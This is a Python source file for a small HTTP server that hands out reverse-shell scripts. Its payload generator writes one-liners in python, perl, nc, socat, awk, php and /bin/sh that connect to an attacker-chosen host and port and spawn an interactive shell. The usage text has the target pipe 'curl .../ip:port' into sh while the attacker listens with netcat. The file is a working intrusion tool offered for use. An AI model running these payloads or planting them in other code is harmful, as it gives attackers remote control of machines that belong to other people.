"""
Copyright 2020 Cristian Souza

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

1. Redistributions of source code must retain the above copyright notice,
this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright
notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
contributors may be used to endorse or promote products derived from
this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

import ssl
import http.server
import socketserver
from urllib.parse import urlparse

PORT = 8080
DOMAIN = "http://127.0.0.1:{}".format(str(PORT))

HTTPS = False
KEY_FILE = "keyfile.key"      # openssl genrsa 2048 > keyfile.key && chmod 400 keyfile.key
CERT_FILE = "certfile.cert"   # openssl req -new -x509 -nodes -sha256 -days 365 -key keyfile.key -out certfile.cert

USAGE = """# Usage
#      Attacker:      nc -l port
#      Target:        curl {}/ip:port | sh\n""".format(DOMAIN)


def is_valid(host_port):
    """Checks if there are a host and a port."""

    if len(host_port.split(":")) != 2:
        return False

    return True

def generate_sh(host_port):
    """Generates different payloads."""

    host, port = host_port.split(":")

    commands = {
        "python" : "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{}\", {})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(host, port),
        "perl" : "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(host, port),
        "nc" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(host, port),
        "socat" : "socat tcp-connect:{}:{} system:/bin/sh".format(host, port),
        "awk" : "awk 'BEGIN {{s = \"/inet/tcp/0/{}/{}\"; while(42) {{ do{{ printf \"$ \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null".format(host, port),
        "php" : "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(host, port),
        "sh" : "/bin/sh -i >& /dev/tcp/{}/{} 0>&1".format(host, port)
    }

    payload = """# Usage
#      Attacker:      nc -l {2}
#      Target:        curl {0}/{1}:{2} | sh\n""".format(DOMAIN, host, port)

    for key, value in commands.items():
        # Checks whether the command exists. If so, executes the payload.
        payload += """
if command -v {} > /dev/null 2>&1; then
    {}
    exit;
fi\n""".format(key, value)

    return payload

class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP request handler."""

    def do_GET(self):
        """Returns the payload or usage information;"""

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        host_port = urlparse(self.path).path[1:]
        if is_valid(host_port):
            self.wfile.write(bytes(generate_sh(host_port), "utf8"))
            return

        self.wfile.write(bytes(USAGE, "utf8"))

        return

def main():
    """Main function."""

    handler_object = HttpRequestHandler
    server = socketserver.TCPServer(("", PORT), handler_object)
    if HTTPS:
        server.socket = ssl.wrap_socket(server.socket, server_side=True,
                                        keyfile=KEY_FILE, certfile=CERT_FILE)
    server.serve_forever()

if __name__ == "__main__":
    main()
